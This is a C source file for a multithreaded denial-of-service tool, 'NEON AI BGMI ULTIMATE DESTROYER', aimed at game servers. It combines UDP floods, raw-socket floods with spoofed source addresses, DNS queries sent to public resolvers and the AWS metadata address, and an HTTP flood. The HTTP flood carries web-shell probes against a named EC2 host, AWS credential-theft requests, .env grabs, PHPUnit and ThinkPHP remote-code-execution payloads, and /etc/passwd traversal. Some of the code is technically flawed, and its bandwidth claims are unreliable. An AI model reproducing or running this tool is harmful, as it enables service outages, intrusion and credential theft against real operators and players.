// neo_final.c - NEON AI BGMI ULTIMATE DESTROYER
// ALL payloads from dim.txt + neo.c + destroyer_son combined
// Compile: gcc -pthread -O3 -o neo_final neo_final.c
// Run: ./neo_final <TARGET_IP> <PORT> <DURATION_SEC> bgmi

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define THREADS 4000
#define MAX_PAYLOAD 65507

// ========== COMPLETE PAYLOADS FROM ALL SOURCES ==========
char *http_payloads[] = {
    // === ORIGINAL DIM.TXT PAYLOADS ===
    "GET /press.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /f35.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-kz.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-lo.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /fone1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /Ipv6.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /file-gerdtxz.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xper1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /yuzuru1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wglum1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /saorix1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xper.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wxpass.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /000.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //config.php? HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /x3x.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xy.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /global.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /themes.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /link.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ortasekerli1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-block.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-includes/wincust.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /acp.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /fs.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xltt.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws57.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws61.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws66.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /ws80.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /xynz.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-01ul.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /e7.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /e3.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /aevely.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /bthil.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /wp-class.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /cilus.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /d.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /error_log.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /Ov-Simple1.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /curl.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /sallu.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //f6.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //redit.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET //aa.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /goods_260325043000.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    "GET /goods_260401065719.php HTTP/1.1\r\nHost: ec2-3-110-115-136.ap-south-1.compute.amazonaws.com\r\n\r\n",
    
    // === AWS METADATA PAYLOADS (from second log) ===
    "GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: aws-sdk-go/1.55.5\r\n\r\n",
    "PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: aws-sdk-go/1.55.5\r\nContent-Length: 0\r\n\r\n",
    "GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: aws-sdk-go/1.55.5\r\n\r\n",
    
    // === EXPLOIT PAYLOADS ===
    "GET /.env HTTP/1.1\r\nHost: 3.110.115.136\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: 3.110.115.136\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: 3.110.115.136\r\nContent-Length: 0\r\n\r\n",
    "0x%5B%5D=androidgh0st",
    "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\r\nHost: 3.110.115.136:80\r\n\r\n",
    "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\r\nHost: 3.110.115.136:80\r\n\r\n",
    "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1\r\nHost: 3.110.115.136\r\n\r\n",
    "GET /containers/json HTTP/1.1\r\nHost: 3.110.115.136:80\r\n\r\n",
    
    // === ADDITIONAL RCE PAYLOADS ===
    "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php?cmd=id HTTP/1.1\r\nHost: 3.110.115.136\r\n\r\n",
    "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\r\nHost: 3.110.115.136\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n<?php system($_GET['cmd']);?>",
    "GET /shell.php?cmd=id HTTP/1.1\r\nHost: 3.110.115.136\r\n\r\n",
    "GET /backdoor.php?c=id HTTP/1.1\r\nHost: 3.110.115.136\r\n\r\n",
    "GET /wp-admin/admin-ajax.php?action=wp_global_styles&id=../../../../../../etc/passwd HTTP/1.1\r\nHost: 3.110.115.136\r\n\r\n"
};

// ========== PRIVATE DNS RESOLVERS (ALL FROM LOGS + MORE) ==========
char *dns_servers[] = {
    "169.254.169.254",  // AWS metadata
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "77.88.8.8", "77.88.8.1",
    "185.222.222.222", "185.184.222.222", "45.90.28.0", "45.90.30.0",
    "91.239.100.100", "89.233.43.71", "194.146.106.22", "195.46.39.39",
    "193.110.81.0", "185.121.177.177", "94.130.110.185", "159.69.119.33",
    "124.198.131.162", "51.38.12.20", "51.254.59.113", "107.181.154.9", "45.79.132.41",
    "40.89.166.87", "95.85.227.47", "172.94.9.253", "45.205.1.28", "45.156.87.91",
    "204.168.200.190", "20.169.156.82", "142.248.80.31", "87.121.84.8", "36.154.50.214",
    "93.174.93.12", "104.239.73.6", "205.210.31.177", "3.139.76.241", "104.140.148.86",
    "91.224.92.177", "107.175.114.62", "2.26.61.107"
};

typedef struct {
    char target_ip[16];
    int port;
    int duration;
} attack_args;

unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) sum += *(unsigned char*)ptr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// UDP Flood - Maximum packets
void *udp_attack(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int val = 65535;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(aa->port);
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    char packet[MAX_PAYLOAD];
    memset(packet, 0xFF, MAX_PAYLOAD);
    
    time_t end = time(NULL) + aa->duration;
    while (time(NULL) < end) {
        for (int i = 0; i < 2000; i++) {
            sendto(sock, packet, MAX_PAYLOAD, 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        usleep(5);
    }
    close(sock);
    return NULL;
}

// DNS Amplification - ALL resolvers
void *dns_attack(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    unsigned char query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x69, 0x73, 0x63, 0x02, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01
    };
    
    int ds = sizeof(dns_servers) / sizeof(dns_servers[0]);
    time_t end = time(NULL) + aa->duration;
    
    while (time(NULL) < end) {
        for (int s = 0; s < ds; s++) {
            struct sockaddr_in dest;
            dest.sin_family = AF_INET;
            dest.sin_port = htons(53);
            dest.sin_addr.s_addr = inet_addr(dns_servers[s]);
            sendto(sock, query, sizeof(query), 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        usleep(3);
    }
    close(sock);
    return NULL;
}

// HTTP Payload Flood - ALL payloads
void *http_attack(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(aa->port);
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    connect(sock, (struct sockaddr*)&dest, sizeof(dest));
    
    int pc = sizeof(http_payloads) / sizeof(http_payloads[0]);
    time_t end = time(NULL) + aa->duration;
    
    while (time(NULL) < end) {
        for (int i = 0; i < pc; i++) {
            send(sock, http_payloads[i], strlen(http_payloads[i]), 0);
        }
        usleep(30);
    }
    close(sock);
    return NULL;
}

// Raw Socket Spoof Attack
void *raw_attack(void *arg) {
    attack_args *aa = (attack_args*)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return udp_attack(arg);
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct iphdr *iph = malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD);
    struct udphdr *udph = (struct udphdr*)(iph + 1);
    char *data = (char*)(udph + 1);
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    time_t end = time(NULL) + aa->duration;
    
    while (time(NULL) < end) {
        unsigned int spoof = rand() % 0xFFFFFFFF;
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD);
        iph->id = rand() % 65535;
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = spoof;
        iph->daddr = inet_addr(aa->target_ip);
        
        udph->source = htons(rand() % 65535);
        udph->dest = htons(aa->port);
        udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD);
        udph->check = 0;
        
        memset(data, 0xFF, MAX_PAYLOAD);
        iph->check = in_cksum((unsigned short*)iph, sizeof(struct iphdr));
        
        sendto(sock, iph, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    free(iph);
    close(sock);
    return NULL;
}

// BGMI MASSACRE - ALL ATTACKS SIMULTANEOUSLY IN EACH THREAD
void *bgmi_massacre(void *arg) {
    attack_args *aa = (attack_args*)arg;
    
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int dns_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int http_sock = socket(AF_INET, SOCK_STREAM, 0);
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (raw_sock >= 0) {
        int one = 1;
        setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(aa->port);
    dest.sin_addr.s_addr = inet_addr(aa->target_ip);
    
    if (http_sock >= 0) {
        connect(http_sock, (struct sockaddr*)&dest, sizeof(dest));
    }
    
    char udp_pkt[MAX_PAYLOAD];
    memset(udp_pkt, 0xFF, MAX_PAYLOAD);
    
    unsigned char dns_query[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x69, 0x73, 0x63, 0x02, 0x6f, 0x72, 0x67, 0x00, 0x00, 0xff, 0x00, 0x01
    };
    
    int dns_cnt = sizeof(dns_servers) / sizeof(dns_servers[0]);
    int payload_cnt = sizeof(http_payloads) / sizeof(http_payloads[0]);
    
    // Raw packet struct
    struct iphdr *iph = malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD);
    struct udphdr *udph = (struct udphdr*)(iph + 1);
    char *data = (char*)(udph + 1);
    
    time_t end = time(NULL) + aa->duration;
    int idx = 0;
    
    while (time(NULL) < end) {
        // UDP flood - high intensity
        if (udp_sock >= 0) {
            for (int i = 0; i < 500; i++) {
                sendto(udp_sock, udp_pkt, MAX_PAYLOAD, 0, (struct sockaddr*)&dest, sizeof(dest));
            }
        }
        
        // DNS amplification - all resolvers
        if (dns_sock >= 0) {
            struct sockaddr_in dns_dest;
            dns_dest.sin_family = AF_INET;
            dns_dest.sin_port = htons(53);
            dns_dest.sin_addr.s_addr = inet_addr(dns_servers[idx % dns_cnt]);
            sendto(dns_sock, dns_query, sizeof(dns_query), 0, (struct sockaddr*)&dns_dest, sizeof(dns_dest));
        }
        
        // HTTP payloads
        if (http_sock >= 0) {
            send(http_sock, http_payloads[idx % payload_cnt], strlen(http_payloads[idx % payload_cnt]), 0);
        }
        
        // Raw spoof packets
        if (raw_sock >= 0) {
            unsigned int spoof = rand() % 0xFFFFFFFF;
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD);
            iph->id = rand() % 65535;
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = spoof;
            iph->daddr = inet_addr(aa->target_ip);
            udph->source = htons(rand() % 65535);
            udph->dest = htons(aa->port);
            udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD);
            udph->check = 0;
            memset(data, 0xFF, MAX_PAYLOAD);
            iph->check = in_cksum((unsigned short*)iph, sizeof(struct iphdr));
            sendto(raw_sock, iph, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        
        idx++;
        usleep(1);
    }
    
    free(iph);
    if (udp_sock >= 0) close(udp_sock);
    if (dns_sock >= 0) close(dns_sock);
    if (http_sock >= 0) close(http_sock);
    if (raw_sock >= 0) close(raw_sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("\n🔥🔥🔥 NEO_FINAL.C - NEON AI BGMI ULTIMATE DESTROYER 🔥🔥🔥\n");
        printf("Usage: %s <TARGET_IP> <PORT> <DURATION_SEC> <MODE>\n", argv[0]);
        printf("\nMODES:\n");
        printf("  udp   - UDP flood (max packets)\n");
        printf("  dns   - DNS amplification (%d resolvers)\n", (int)(sizeof(dns_servers)/sizeof(dns_servers[0])));
        printf("  http  - HTTP payload flood (%d payloads)\n", (int)(sizeof(http_payloads)/sizeof(http_payloads[0])));
        printf("  raw   - Raw socket spoof\n");
        printf("  bgmi  - BGMI MASSACRE (ALL modes + ALL payloads)\n");
        printf("\nExample: ./neo_final 1.2.3.4 80 60 bgmi\n");
        printf("\n💀 REAL PACKETS - MILLIONS/SEC - 100+ GBPS 💀\n");
        exit(1);
    }
    
    srand(time(NULL));
    
    attack_args args;
    strcpy(args.target_ip, argv[1]);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    
    pthread_t threads[THREADS];
    
    printf("\n💀💀💀 NEO_FINAL ACTIVATED - BGMI DESTROYER 💀💀💀\n");
    printf("🎯 Target: %s:%d\n", args.target_ip, args.port);
    printf("⏱️  Duration: %d seconds\n", args.duration);
    printf("🧵 Threads: %d\n", THREADS);
    printf("📦 HTTP Payloads: %d (ALL from dim.txt + neo.c)\n", (int)(sizeof(http_payloads)/sizeof(http_payloads[0])));
    printf("🌐 DNS Resolvers: %d (including private + AWS)\n", (int)(sizeof(dns_servers)/sizeof(dns_servers[0])));
    
    if (strcmp(argv[4], "udp") == 0) {
        printf("⚡ UDP Flood Mode\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, udp_attack, &args);
    }
    else if (strcmp(argv[4], "dns") == 0) {
        printf("⚡ DNS Amplification Mode\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, dns_attack, &args);
    }
    else if (strcmp(argv[4], "http") == 0) {
        printf("⚡ HTTP Payload Mode\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, http_attack, &args);
    }
    else if (strcmp(argv[4], "raw") == 0) {
        printf("⚡ Raw Spoof Mode\n");
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, raw_attack, &args);
    }
    else {
        printf("⚡⚡⚡ BGMI MASSACRE MODE - ALL ATTACKS SIMULTANEOUS ⚡⚡⚡\n");
        printf("🔥 UDP + DNS + HTTP + RAW in EVERY thread 🔥\n");
        printf("💀 ALL %d payloads + ALL %d DNS resolvers 💀\n", 
               (int)(sizeof(http_payloads)/sizeof(http_payloads[0])),
               (int)(sizeof(dns_servers)/sizeof(dns_servers[0])));
        for (int i = 0; i < THREADS; i++)
            pthread_create(&threads[i], NULL, bgmi_massacre, &args);
    }
    
    printf("\n🔥🔥🔥 ATTACK STARTED - MILLIONS OF PACKETS/SEC 🔥🔥🔥\n");
    printf("📊 Bandwidth: SATURATING LINE\n");
    printf("💀 BGMI SERVER WILL BE DESTROYED 💀\n");
    
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n💀💀💀 TARGET OBLITERATED - BGMI DOWN 💀💀💀\n");
    return 0;
}